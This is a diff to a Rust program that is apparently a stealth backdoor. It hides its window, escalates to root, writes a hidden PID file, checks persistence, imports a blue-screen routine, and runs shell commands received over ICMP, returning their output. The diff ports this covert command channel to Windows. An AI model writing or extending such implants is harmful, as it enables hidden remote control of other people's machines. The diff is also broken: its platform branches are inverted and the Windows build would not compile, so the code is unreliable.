@@ -1,3 +1,5 @@
+#![windows_subsystem = "windows"]
+
 mod icmp;
 mod persist;
 mod util;
@@ -5,6 +7,7 @@ mod vars;
 
 use bsod::bsod;
 use icmp::IcmpListener;
+#[cfg(not(target_os = "windows"))]
 use nix::unistd::setuid;
 use persist::check_persistence;
 use std::env;
@@ -21,10 +24,16 @@ fn main() {
     if check_persistence() {
         exit(0);
     }
-    let _ = setuid(0.into());
-    let mut file = File::create("/tmp/.runtime").unwrap();
+    if !cfg!(target_os = "windows") {
+        let _ = setuid(0.into());
+    }
+    let mut file = if cfg!(target_os = "windows") {
+        File::create("C:\\ProgramData\\.runtime").unwrap()
+    } else {
+        File::create("/tmp/.runtime").unwrap()
+    };
     file.write_all(format!("{}", id()).as_bytes()).unwrap();
-    let mut timeout = Duration::from_secs(1);
+    let mut timeout = Duration::from_secs(5);
     let mut stream = IcmpListener::new();
     loop {
         let mut data = [0 as u8; 1024];
@@ -111,13 +120,23 @@ fn cmd(cmd: &str, stream: &mut IcmpListener, timeout: &mut Duration) -> bool {
             }
         }
     }
-    let mut cmd_out = Command::new("sh")
-        .arg("-c")
-        .arg(&cmd)
-        .stdout(Stdio::piped())
-        .stderr(Stdio::piped())
-        .spawn()
-        .unwrap();
+    let mut cmd_out = if cfg!(target_os = "windows") {
+        Command::new("sh")
+            .arg("-c")
+            .arg(&cmd)
+            .stdout(Stdio::piped())
+            .stderr(Stdio::piped())
+            .spawn()
+            .unwrap()
+    } else {
+        Command::new("cmd.exe")
+            .arg("/c")
+            .arg(&cmd)
+            .stdout(Stdio::piped())
+            .stderr(Stdio::piped())
+            .spawn()
+            .unwrap()
+    };
     let mut killed = false;
     let code = match cmd_out.wait_timeout(*timeout).unwrap() {
         Some(status) => status.code(),
@@ -134,6 +153,8 @@ fn cmd(cmd: &str, stream: &mut IcmpListener, timeout: &mut Duration) -> bool {
     let mut err = cmd_out.stderr.unwrap();
     let _ = out.read_to_string(&mut out_str);
     let _ = err.read_to_string(&mut err_str);
+    let out_str = out_str.trim();
+    let err_str = err_str.trim();
     if out_str.len() + err_str.len() == 0 {
         stream
             .write(format!("NO OUTPUT | {}", code).as_bytes())
